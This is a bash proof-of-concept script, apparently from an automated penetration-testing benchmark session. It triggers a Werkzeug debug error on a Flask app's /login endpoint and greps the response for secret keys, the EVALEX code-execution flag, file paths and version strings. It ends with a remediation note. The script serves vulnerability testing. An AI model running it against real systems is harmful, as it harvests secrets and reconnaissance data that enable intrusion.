#!/bin/bash
# POC: POC to demonstrate Werkzeug debug mode enabled on Flask application, exposing SECRET_KEY, EVALEX flag, file paths, framework versions, and full stack traces.
# Target: ./repo
# Created: 2025-11-05T16:45:25.166Z
# Session: benchmark-XBEN-032-24-mhm7iwy4

# Werkzeug Debug Mode Information Disclosure POC
# This script triggers an error on the Flask application to capture debug information

TARGET_URL="${1:-http://localhost}"
ENDPOINT="/login"
LOG_FILE="werkzeug_debug_response.html"

echo "[*] Werkzeug Debug Mode Information Disclosure POC"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo "[*] Attempting to trigger error and capture debug output..."
echo ""

# Send invalid JSON to trigger an error
RESPONSE=$(curl -s -X POST \
  "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/json" \
  -d 'invalid' \
  -w "\n%{http_code}")

# Extract status code (last line)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
# Extract body (all but last line)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

# Save full response
echo "$BODY" > "$LOG_FILE"

# Check for debug indicators
echo "[*] Checking for debug mode indicators..."
echo ""

# Check for SECRET_KEY
if echo "$BODY" | grep -q "SECRET"; then
    echo "[✓] FOUND: SECRET_KEY or secret data in response"
    echo "$BODY" | grep -o "SECRET[^<]*" | head -3
    echo ""
fi

# Check for EVALEX flag
if echo "$BODY" | grep -q "EVALEX"; then
    echo "[✓] FOUND: EVALEX flag (debugger code execution)"
    echo "$BODY" | grep -o "EVALEX[^,}]*" | head -3
    echo ""
fi

# Check for file paths
if echo "$BODY" | grep -qE "/(home|var|tmp|opt|usr).*\.py"; then
    echo "[✓] FOUND: File paths exposed"
    echo "$BODY" | grep -oE "/(home|var|tmp|opt|usr)[^<\"]*\.py" | head -5
    echo ""
fi

# Check for framework versions
if echo "$BODY" | grep -qiE "(werkzeug|flask|python).*[0-9]+\.[0-9]+"; then
    echo "[✓] FOUND: Framework/Library versions"
    echo "$BODY" | grep -oiE "(werkzeug|flask|python)[^<]*[0-9]+\.[0-9]+\.[0-9]+" | head -5
    echo ""
fi

# Check for Werkzeug debugger interface
if echo "$BODY" | grep -q "Werkzeug"; then
    echo "[✓] FOUND: Werkzeug debugger interface present"
    echo ""
fi

# Check for stack trace
if echo "$BODY" | grep -qE "<title>.*Error|Traceback"; then
    echo "[✓] FOUND: Error traceback/stack trace"
    echo ""
fi

# Summary
if [ "$HTTP_CODE" = "500" ]; then
    echo "[+] SUCCESS: Server returned 500 error with debug information"
    echo "[+] Full response saved to: $LOG_FILE"
    echo ""
    echo "[VULNERABILITY CONFIRMED]"
    echo "- Debug mode is ENABLED"
    echo "- Sensitive information is being disclosed"
    echo "- Remediation: Set app.run(debug=False) and use environment-based configuration"
    exit 0
else
    echo "[-] Server returned HTTP $HTTP_CODE"
    echo "[!] Debug mode may not be enabled, or target is not vulnerable"
    echo "[+] Full response saved to: $LOG_FILE for manual inspection"
    exit 1
fi